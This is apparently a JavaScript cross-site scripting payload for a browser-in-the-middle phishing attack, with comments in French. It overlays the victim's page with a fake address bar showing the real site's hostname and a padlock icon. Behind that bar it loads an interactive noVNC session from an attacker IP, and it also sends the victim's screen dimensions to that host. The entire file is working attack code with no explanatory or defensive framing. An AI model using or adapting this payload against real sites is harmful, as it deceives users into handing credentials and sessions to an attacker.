(function() {
    console.log('[BiTM XSS] Injecting noVNC iframe...');
    
    const ATTACKER_IP = '10.25.11.18';
    
    // Overlay fullscreen
    const overlay = document.createElement('div');
    overlay.style.cssText = `
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100vw !important;
        height: 100vh !important;
        z-index: 2147483647 !important;
        background: #1a1a1a !important;
        margin: 0 !important;
        padding: 0 !important;
        overflow: hidden !important;
    `;
    
    // Fausse barre d'adresse
    const fakeBar = document.createElement('div');
    fakeBar.style.cssText = `
        position: absolute !important;
        top: 0 !important;
        left: 0 !important;
        width: 100% !important;
        height: 50px !important;
        background: #f1f3f4 !important;
        border-bottom: 1px solid #dadce0 !important;
        display: flex !important;
        align-items: center !important;
        padding: 0 16px !important;
        font: 14px Arial, sans-serif !important;
        z-index: 2147483648 !important;
    `;
    fakeBar.innerHTML = `
        <svg width="18" height="18" style="margin-right: 12px;" viewBox="0 0 24 24">
            <path fill="#5f6368" d="M12 2L2 7v10c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-10-5z"/>
            <path fill="#34a853" d="M10 17l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
        </svg>
        <div style="flex:1; background:#fff; border-radius:20px; padding:8px 16px; display:flex; align-items:center;">
            <span style="color:#202124; font-weight:500;">https://</span>
            <span style="color:#202124;">${window.location.hostname}:${window.location.port}</span>
        </div>
    `;
    
    // Iframe noVNC
    const iframe = document.createElement('iframe');
    iframe.src = `https://${ATTACKER_IP}:6443/vnc_lite.html?autoconnect=true&resize=scale&quality=9&view_only=false&show_dot=false`;
    iframe.style.cssText = `
        position: absolute !important;
        top: 50px !important;
        left: 0 !important;
        width: 100% !important;
        height: calc(100% - 50px) !important;
        border: none !important;
        margin: 0 !important;
        padding: 0 !important;
        display: block !important;
    `;
    
    // Quand l'iframe charge, injecter CSS pour forcer le scaling
    iframe.onload = () => {
        try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            const style = iframeDoc.createElement('style');
            style.textContent = `
                #noVNC_container {
                    width: 100% !important;
                    height: 100% !important;
                    position: absolute !important;
                    top: 0 !important;
                    left: 0 !important;
                }
                #noVNC_screen {
                    width: 100% !important;
                    height: 100% !important;
                }
                canvas {
                    width: 100% !important;
                    height: 100% !important;
                    object-fit: contain !important;
                }
            `;
            iframeDoc.head.appendChild(style);
        } catch (e) {
            console.log('[BiTM] Cannot inject CSS into iframe (cross-origin)');
        }
    };
    
    // Assembler
    overlay.appendChild(fakeBar);
    overlay.appendChild(iframe);
    document.body.appendChild(overlay);
    
    // Bloquer scroll
    document.body.style.cssText = 'margin:0 !important; padding:0 !important; overflow:hidden !important;';
    document.documentElement.style.cssText = 'margin:0 !important; padding:0 !important; overflow:hidden !important;';
    
    console.log('[BiTM XSS] Iframe injected');
    
    // Envoyer taille
    fetch(`https://${ATTACKER_IP}:3000/postScreenSize`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            width: window.innerWidth,
            height: window.innerHeight - 50
        })
    }).catch(() => {});
})();